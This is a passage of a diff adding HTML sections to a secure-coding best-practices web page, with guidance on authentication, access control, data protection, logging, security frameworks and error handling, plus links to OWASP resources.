+                                                                <li>Add a security champion to each development team. A security champion is a developer with an interest in security who helps amplify
+                                                                    the security message at the team level. Security champions don’t need to be security pros; they just need to act as the security conscience of the team,
+                                                                    keeping their eyes and ears open for potential issues. Once the team is aware of these issues, it can then either fix the issues in development or call in your
+                                                                    organization’s security experts to provide guidance.</li>
+                                                                <li>Consider data protections from the beginning. Include security up front when agreeing upon the definition of “done” for a project</li>
+                                                                <li>Integrate security testing in continuous integration to create fast, automated feedback loops</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>THOUGHTS</h3>
+                                                            <p>This category includes some of the most common attacks to befound in the wild - includingCrossSiteScripting (XSS).  Cross-site scripting is where things begin to get 
+                                                                really interesting, starting with the fact that it’s by far and away the most commonly exploited vulnerability out there today. Last year, WhiteHat Security delivered 
+                                                                their Website Security Statistics Report and found a staggering 65% of websites with XSS vulnerabilities, that’s four times as many as the SQL injection vulnerability 
+                                                                we just looked at.</p>
+                                                            <hr>
+                                                            <h3>EXAMPLES - Validating Emails</h3>
+                                                            <p></p>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project" target="_blank">OWASP Application Security Verification Standard Project</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank">OWASP Testing Guide</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">5</div>
+                                                            <h2>Implement Identify and Authentication Controls</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>You can avoid security breaches by confirming user identity up front and building strong authentication controls into code and systems. These controls
+                                                                must extend beyond a basic username and password. You’ll want to include both session management and identity management controls to provide the highest
+                                                                level of protection.  
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Use strong authentication methods, including multi-factor authentication,  such as FIDO or dedicated apps.</li>
+                                                                <li>Consider biometric authentication methods, such as fingerprint, facial recognition, and voice recognition, to verify the identity of users. </li>
+                                                                <li>Implement secure password storage. </li>
+                                                                <li>Implement a secure password recovery mechanism to help users gain access to their account if they forget their password.</li>
+                                                                <li>Establish timeout and inactivity periods for every session.</li>
+                                                                <li>Use re-authentication for sensitive or highly secure features.</li>
+                                                                <li>Use monitoring and analytics to spot suspicious IP addresses and machine IDs.</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>EXAMPLES - Password hashing</h3>
+                                                            <p></p>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet" target="_blank">OWASP Authentication Cheat Sheet</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet" target="_blank">OWASP Password Storage Cheat Sheet</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet" target="_blank">OWASP Session Management Cheat Sheet</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">6</div>
+                                                            <h2>Implement Access Controls</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>You can dramatically improve protection and resiliency in your applications by building authorization or access controls into your applications in the initial
+                                                                stages of application development. Note that authorization is not the same as authentication. According to OWASP, authorization is the “process where
+                                                                requests to access a particular feature or resource should be granted or denied.”  When appropriate, authorization should include a multi-tenancy and horizontal
+                                                                (data specific) access control. 
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Use a security-centric design, where access is verified first. Consider using a filter or other automated mechanism to ensure that all requests go through
+                                                                    an access control check.</li>
+                                                                <li>Consider denying all access for features that haven’t been configured for access control.</li>
+                                                                <li>Code to the principle of least privilege. Allocate the minimum privilege and time span required to perform an action for each user or system component.</li>
+                                                                <li>Separate access control policy and application code, whenever possible.</li>
+                                                                <li>Consider checking if the user has access to a feature in code, as opposed to checking the user's role.</li>
+                                                                <li>Adopt a framework that supports server-side trusted data for driving access control. Key elements of the framework include user identity and log-in
+                                                                    state, user entitlements, overall access control policy, the feature and data requested, along with time and geolocation.</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>EXAMPLES - Coding to Activity</h3>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Access_Control_Cheat_Sheet" target="_blank">OWASP Access Control Cheat Sheet</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/Testing_for_Authorization" target="_blank">OWASP Testing Guide for Authorization</a></li>
+                                                                <li><a href="https://www.veracode.com/security/spoofing-attack" target="_blank">Veracode Guide to Spoofing Attacks</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">7</div>
+                                                            <h2>Protect Data</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>Organizations have a duty to protect sensitive data within applications. To that end, you must encrypt critical data while it’s at rest and in transit. This includes
+                                                                financial transactions, web data, browser data, and information residing in mobile apps. Regulations like the EU General Data Protection Regulation make
+                                                                data protection a serious compliance issue. 
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Don’t be tempted to implement your own homegrown libraries. Use security-focused, peer-reviewed, and open source libraries, including
+                                                                    the Google KeyCzar project, Bouncy Castle, and the functions included in SDKs. Most modern languages have implemented crypto-libraries and
+                                                                    modules, so choose one based on your application’s language. </li>
+                                                                <li>Don’t neglect the more difficult aspects of applied crypto, such as key management, overall cryptographic architecture design, tiering, and trust
+                                                                    issues in complex software. Existing crypto hardware, such as a Hardware Security Module (HSM), can make your job easier. </li>
+                                                                <li>Avoid using an inadequate key, or storing the key along with the encrypted data.</li>
+                                                                <li>Don’t make confidential or sensitive data accessible in memory, or allow it to be written into temporary storage locations or log files that an attacker can view.</li>
+                                                                <li>Use transport layer security (TLS) to encrypt data in transit. </li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>EXAMPLES - Cryptographically secure pseudo-random number generator</h3>
+                                                            <p></p>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet" target="_blank">OWASP Password Storage Cheat Sheet</a></li>
+                                                                <li><a href="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet" target="_blank">OWASP Cryptographic Storage Cheat Sheet</a></li>
+                                                                <li><a href="https://www.veracode.com/blog/research/cryptographically-secure-pseudo-random-number-generator-csprng" target="_blank">Cryptographically Secure Pseudo-Random Number Generators</a></li>
+                                                                <li><a href="https://www.veracode.com/blog/research/encryption-and-decryption-java-cryptography" target="_blank">Encryption and Decryption in Java Cryptography</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">8</div>
+                                                            <h2>Implement Logging and Intrustion Detection</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>Logging should be used for more than just debugging and troubleshooting.  Logging and tracking security events and metrics helps to enable what’s
+                                                                known as attack-driven defense, which considers the scenarios for real-world attacks against your system. For example, if a server-side
+                                                                validation catches a change to a non-editable, throw an alert or take some other action to protect your system. Focus on four key areas: application
+                                                                monitoring; business analytics and insight; activity auditing and compliance monitoring; and system intrusion detection and forensics.
+                                                                    
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Use an extensible logging framework like Serilog, or Apache Log4j2 / Log4net, to ensure that all log entries are consistent.</li>
+                                                                <li>Keep various audit and transaction logs separate for both security and auditing purposes.</li>
+                                                                <li>Always log the timestamp and identifying information, like source IP and user ID.</li>
+                                                                <li>Don’t log opt-out data, session IDs, or hash value of passwords, or sensitive or private data including credit card or Social Security numbers. </li>
+                                                                <li>Perform encoding on untrusted data before logging it to protect from log injection, also referred to as log forging.</li>
+                                                                <li>Log at an optimal level. Too much or too little logging heightens risk.</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>EXAMPLES - Mobile Logging</h3>
+                                                            <p></p>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Logging_Cheat_Sheet" target="_blank">OWASP Logging Cheat Sheet</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>     
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">9</div>
+                                                            <h2>Leverage Security Frameworks and Libraries</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>You can waste a lot of time — and unintentionally create security flaws — by developing security controls from scratch for every web application you’re
+                                                                working on. To avoid that, take advantage of established security frameworks and, when necessary, respected third-party libraries that provide tested and
+                                                                proven security controls. 
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Use existing secure framework features rather than using new tools, such as third-party libraries.</li>
+                                                                <li>Because some frameworks have security flaws, build in additional controls or security protections as needed.</li>
+                                                                <li>Use web application security frameworks, including Spring Security, Apache Shiro, Django Security, and Flask security.</li>
+                                                                <li>Regularly check for security flaws, and keep frameworks and libraries up to date. By understanding not just the status of the component but whether or not a
+                                                                    vulnerable method is being called, organizations can pinpoint their component risk and prioritize fixes based on the riskiest uses of components.
+                                                                    </li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://info.veracode.com/webinars-not-a-free-lunch-a-best-practice-guide-on-how-to-get-a-handle-on-your-open-source-risk.html" target="_blank">A Best Practice Guide to Managing Your Open Source Risk</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>     
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <div class="best-practices-block">
+                                                        <div class="bp-header">
+                                                            <div class="id">10</div>
+                                                            <h2>Monitor Error and Exception Handling</h2>
+                                                        </div>
+                                                        <div class="bp-body">
+                                                            <p>Error and exception handling isn’t exciting, but like input validation, it is a crucial element of defensive coding. Mistakes in error and exception handling can cause
+                                                                leakage of information to attackers, who can use it to better understand your platform or design. Even small mistakes in error handling have been found to
+                                                                cause catastrophic failures in distributed systems.
+                                                            </p>
+                                                            <hr>
+                                                            <h3>GUIDANCE</h3>
+                                                            <ul>
+                                                                <li>Conduct careful code reviews and use negative testing, including exploratory testing and pen testing, fuzzing, and fault injection, to identify problems in
+                                                                    error handling.</li>
+                                                                <li>Manage exceptions in a centralized manner to avoid duplicated try/catch blocks in the code. In addition, verify that all unexpected behaviors are
+                                                                    correctly handled inside the application.</li>
+                                                                <li>Confirm that error messages sent to users aren't susceptible to critical data leaks, and that exceptions are logged in a way that delivers enough information
+                                                                    for QA, forensics, or incident response teams to understand the problem.</li>
+                                                            </ul>
+                                                            <hr>
+                                                            <h3>EXAMPLE - Information Leakage</h3>
+                                                            <p></p>
+                                                            <hr>
+                                                            <h3>ADDITIONAL RESOURCES</h3>
+                                                            <ul class="checkItem">
+                                                                <li><a href="https://www.owasp.org/index.php/Error_Handling" target="_blank">OWASP Code Review Guide: Error Handling</a></li>
+                                                            </ul>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>     
+                                    <div class="row sqs-row">
+                                        <div class="col sqs-col-12 span-12">
+                                            <div class="sqs-block html-block sqs-block-html  txt-article" data-block-type="2" id="block-c15ad40843fc74840dfc">
+                                                <div class="sqs-block-content">
+                                                    <h2>Additional Resources</h2>
+                                                    <p>There are countless articles from both vendors and thought leaders on what are logging best practices and which framework you should be using.  I prefer to keep it simple and 
+                                                        focus only on things that are universal.  The answer as to which frameworkto use and what your exact standards should be are really a matter for your team to decide.  After all,
+                                                        they understand their needs bettwe than anyone else.  Just make sure that it is uniformly applied.
+                                                    </p>
+                                                    <ul style="list-style: none">
+                                                        <li><a href="https://www.amazon.com/Tangled-Web-Securing-Modern-Applications/dp/1593273886" target="_blank">The Tangled Web: A Guide to Securing Modern Web Applications</a></li>
+                                                        <li><a href="https://www.amazon.com/Secure-Java-Web-Application-Development/dp/1439823510" target="_blank">Secure Java: For Web Application Development</a></li>
+                                                        <li><a href="https://www.veracode.com/resources/video/understanding-applications-security-ecosystem" target="_blank">Understanding Applications in the Security Ecosystem</a></li>
+                                                        <li><a href="https://www.veracode.com/resources/video/branded-vulnerabilities" target="_blank">Branded Vulnerabilities: How to Respond to Real Risk, Not Media Hype</a></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
                                     <!-- CONCLuSION SPACER-->
                                     <div class="row sqs-row">
                                         <div class="col sqs-col-12 span-12">
@@ -960,7 +1199,7 @@ log.debug(<span style="background-color: #fff0f0">&quot;Message with id &#39;{}&
                                 <div class="row sqs-row">
                                     <div class="sqs-block button-block sqs-block-button" data-block-type="53" id="block-yui_3_17_2_7_1471630032837_105825">
                                         <div class="sqs-block-content txt-article" style="padding-left: 15px;">
-                                            <a href="/monitoring.html" class="sqs-block-button-element--small sqs-block-button-element abstract-block-btn" data-initialized="true">Back to Monitoring →</a>
+                                            <a href="/security.html" class="sqs-block-button-element--small sqs-block-button-element abstract-block-btn" data-initialized="true">Back to Security →</a>
                                         </div>
                                     </div>
                                 </div>
